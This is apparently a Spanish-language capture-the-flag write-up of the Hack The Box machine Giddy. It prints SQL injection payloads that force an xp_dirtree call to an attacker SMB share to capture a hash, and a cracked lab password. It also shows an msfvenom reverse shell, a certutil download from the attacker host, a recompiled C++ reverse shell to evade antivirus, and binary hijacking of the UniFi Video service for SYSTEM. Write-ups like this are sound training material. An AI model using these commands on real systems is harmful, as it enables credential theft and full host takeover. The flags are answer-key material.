---
tags:
  - env/windows
  - estado/completo
  - cert/oscp
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/153
dificultad: Media
ip: 10.10.10.104
os: Windows
relacionados:
  - "[[SQL Injection (SQLi)|SQLI]]"
  - "[[xp_dirtree]]"
  - "[[Net-NTLMv2 Hash]]"
  - "[[Windows Defender Evasion]]"
  - "[[Abusing Unifi-Video]]"
  - "[[AppLocker evasion]]"
---
# HackTheBox - Giddy
## Reconocimiento
### Escaneo de Puertos

Mi fase inicial de reconocimiento comenzó con un escaneo exhaustivo de la máquina objetivo en la IP `10.10.10.104`. Para optimizar el tiempo, primero utilicé `masscan` para identificar rápidamente todos los puertos abiertos, tanto TCP como UDP.
```Bash
masscan -p1-65535,U:1-65535 10.10.10.104 --rate=1000 -e tun0 > ports
```

Una vez que obtuve la lista de puertos, la procesé para pasarlos a `nmap` y realizar un análisis más detallado sobre los servicios, versiones y scripts de reconocimiento básicos.
```Bash
nmap -sCV -p80,443,3389,5985 $(cat ip) --version-all --script-timeout 30s -oN 01_Reconnaissance/sCV
```

Los resultados de `nmap` revelaron varios puertos abiertos de interés:
- **Puerto 80/tcp y 443/tcp:** Ambos corrían un servidor web **Microsoft IIS 10.0**. Esta versión suele estar asociada con Windows Server 2016 o Windows 10.
- **Puerto 3389/tcp:** Servicio de Escritorio Remoto (RDP).
- **Puerto 5985/tcp:** WinRM (Windows Remote Management), lo que sugiere que podría haber acceso a la gestión remota a través de PowerShell.
    
### Enumeración Web

Con los puertos web identificados, procedí a enumerar los directorios para descubrir contenido oculto. Utilicé `Filebuster`, una herramienta rápida basada en Perl, para esta tarea.
```Bash
gobuster dir -u http://$(cat ip) -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 --no-error -o 01_Reconnaissance/dirs
```

El escaneo reveló dos directorios clave:
- `/remote`: Esta ruta me redirigió a una página de **PowerShell Web Access**, una interfaz web para ejecutar comandos de PowerShell de forma remota. Esto se convirtió en un posible punto de entrada si conseguía credenciales.
- `/mvc`: Este directorio albergaba una aplicación web personalizada que mostraba una lista de productos y un buscador.


___

## Análisis de vulnerabilidades

### SQL Injection en /mvc

Decidí centrar mi atención en la aplicación `/mvc`. Al interactuar con la funcionalidad de búsqueda, probé una inyección de SQL básica. Introduje una comilla simple (`'`) en el campo de búsqueda, lo que provocó un error en la base de datos. Esto fue un claro indicio de una posible vulnerabilidad.

La inyección SQL funciona sin romper la consulta, o sea sin necesidad de agregar una comilla y luego poner un comentario, ejemplos:
```http
https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=19 order by 1
```

Haciendo pruebas pude llegar a enumerar 25 columnas, pero ninguna parece visible. Por otro lado inyecciones como `1=1` funcionan y también lo hacen inyecciones a ciegas.


___

## Explotación de vulnerabilidades

### Captura de Hash NetNTLM con xp_dirtree

Aunque no era `sa`, sabía que podía aprovechar la SQLi para interactuar con el sistema operativo subyacente. Utilicé el procedimiento almacenado no documentado `xp_dirtree`, que permite al motor de SQL Server interactuar con el sistema de archivos, incluyendo rutas de red UNC.

Mi estrategia fue forzar al servicio de SQL Server a conectarse a un recurso compartido SMB bajo mi control. Al hacerlo, capturaría el hash NetNTLM de la cuenta de servicio que ejecuta SQL Server.

Primero, levanté un servidor SMB malicioso en mi máquina usando `smbserver.py` de Impacket.
```Bash
impacket-smbserver share $(pwd) -smb2support
```
o
```bash
sudo responder -I tun0 -v
```

Luego, a través de la inyección SQL, ejecuté el siguiente comando para que el servidor se conectara a mi máquina:
```SQL
EXEC xp_dirtree '\\10.10.14.17\share'
```
URL completa con el código de recién: 
```http
https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=19%20EXEC%20xp_dirtree%20%27\\10.10.14.17\share%27
```

Inmediatamente, recibí la conexión en mi listener de Impacket y capturé el hash NetNTLMv2 de un usuario llamado **Stacy**.

> [!info] Captura de Hash
> 
> El hash capturado pertenecía a GIDDY\Stacy. El siguiente paso era intentar romper este hash para obtener la contraseña en texto plano.

Procedí a crackear el hash utilizando **John The Ripper** y el popular diccionario `rockyou.txt`.
```Bash
john stacy.hash -w=/usr/share/wordlists/rockyou.txt
```

El proceso fue sorprendentemente rápido y reveló las credenciales:

**`Stacy:xNnWo6272k7x`**

### Acceso vía PowerShell Web Access

Con las credenciales de Stacy en mi poder, volví al portal de **PowerShell Web Access** que había descubierto en `/remote`. Para asegurar un inicio de sesión local y no de dominio, utilicé el formato `.\Stacy`.

Una vez dentro, me encontré con una sesión de PowerShell. Sin embargo, mis capacidades estaban severamente limitadas. Al verificar el entorno, descubrí el motivo.
```PowerShell
$host.runspace.languagemode
```

La salida fue `ConstrainedLanguage`. Esto indicaba que **AppLocker** estaba activo, restringiendo severamente los comandos y objetos de .NET que podía utilizar. Intentos de usar WMI o enumerar servicios fallaron.

> [!warning] PowerShell en Modo Restringido
> 
> El modo ConstrainedLanguage es una medida de seguridad potente que limita a un atacante a un conjunto muy básico de cmdlets, impidiendo la ejecución de scripts complejos o el acceso a APIs de Win32, lo que dificulta enormemente la enumeración y el movimiento lateral.

### a) Archivo suelto `unifivideo`

En el directorio `Documents` hay un archivo curioso denominado `unifivideo`, en caso de que no hubiera estado ahí para llamarme la atención, podría haber hecho enumeración en el registro de windows

### b) Enumeración del Registro

Dado que los comandos estándar de PowerShell estaban bloqueados, tuve que buscar métodos alternativos de enumeración. Decidí consultar directamente el registro de Windows para identificar el software instalado, una técnica que a menudo elude las restricciones de AppLocker.

Ejecuté el siguiente comando para listar las claves de desinstalación de programas:
```PowerShell
cmd /c REG QUERY HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
```

Revisando la larga lista de software, una entrada me llamó la atención: **"Ubiquiti UniFi Video"**. El software de terceros es a menudo una fuente de vulnerabilidades de escalada de privilegios.


___

## Escalada de privilegios

### Identificación de la Vulnerabilidad

Con el nombre del software, utilicé `searchsploit` en mi máquina local para buscar vulnerabilidades conocidas.
```Bash
searchsploit unifi video
```

Los resultados mostraron un exploit de **Escalada de Privilegios Locales** (LPE) para Ubiquiti UniFi Video (Exploit-DB 43390). Al analizar el exploit, descubrí la naturaleza de la vulnerabilidad:

El servicio "Ubiquiti UniFi Video" se ejecuta con los privilegios más altos (`NT AUTHORITY\SYSTEM`). Al iniciar o detenerse, intenta ejecutar el binario `taskkill.exe` desde la ruta `C:\ProgramData\unifi-video\`. El problema es que este directorio es escribible por cualquier usuario autenticado en el sistema.

Esto me presentaba una clara oportunidad de **secuestro de DLL/binario**. Podía reemplazar el `taskkill.exe` legítimo con un payload malicioso y, al reiniciar el servicio, este se ejecutaría como `SYSTEM`.

Verifiqué los permisos del directorio y el estado del servicio desde mi sesión de PowerShell restringida:
```PowerShell
icacls C:\ProgramData\unifi-video
Get-Service "Ubiquiti UniFi Video" | fl *
```

Confirmé que tenía permisos de escritura en la carpeta y que podía iniciar y detener el servicio.

### Creación y Ejecución del Payload

#### Intento con`msfvenom` (falla por detección del antivirus)

Para el payload, la idea es crearlo con `msfvenom`, pero antes tengo que verificar si se trata de una maquina windows de 64 o 32 bits:
```powershell
systeminfo # no funciona
[Environment]::Is64BitOperatingSystem # True
[Environment]::Is64BitProcess # True
```
Efectivamente es un Windows de 64 bits.

Creo que el payload con `msfvenom`:
```bash
> msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.17 LPORT=443 -f exe > taskkill.exe
```

A continuación, monté un servidor web simple en Python para transferir el archivo a la máquina víctima. En la sesión de PowerShell, utilicé `certutil` para descargar el payload:
```PowerShell
# En mi máquina atacante
python3 -m http.server 80

# En la máquina víctima (sesión de Stacy)
certutil.exe -f -urlcache -split http://10.10.14.17/taskkill.exe taskkill.exe
```

Luego de la transferencia Windows me eliminó el archivo y al querer volver a pasarlo para ejecutarlo rápido, me dice que el antivirus detecto un archivo malicioso.

#### Alternativa: 

Decidí compilar una reverse shell simple en C++ para evitar las firmas de antivirus comunes. Utilicé el código "prometheus" de @paranoidninja (https://github.com/paranoidninja/0xdarkvortex-MalwareDevelopment), modificando la ip y el puerto que necesito yo para lograr la reverse shell. 

Compilé el código en mi máquina Kali usando `mingw-w64` para generar un ejecutable de Windows, nombrándolo `taskkill.exe`:
```bash
i686-w64-mingw32-g++ prometheus.cpp -o taskkill.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

Finalmente, configuré un listener de `netcat` en mi máquina para recibir la conexión inversa.
```Bash
rlwrap nc -nlvp 443
```

Con todo en su lugar, detuve el servicio de "Ubiquiti UniFi Video".
```PowerShell
Stop-Service "Ubiquiti UniFi Video"
```

Tras unos segundos, el servicio intentó ejecutar mi `taskkill.exe` malicioso, y recibí una shell en mi listener de `netcat` con los privilegios más altos del sistema.

**Shell obtenida como `NT AUTHORITY\SYSTEM`**


---

## Bandera(s)

> [!flag] `flag{user}`
> a9ca42ee6acfa31676711268856a10b8
^bandera-user

> [!flag] `flag{root}`
> 1c075db9fa4c224d7051bc9beb4b9f51
^bandera-root
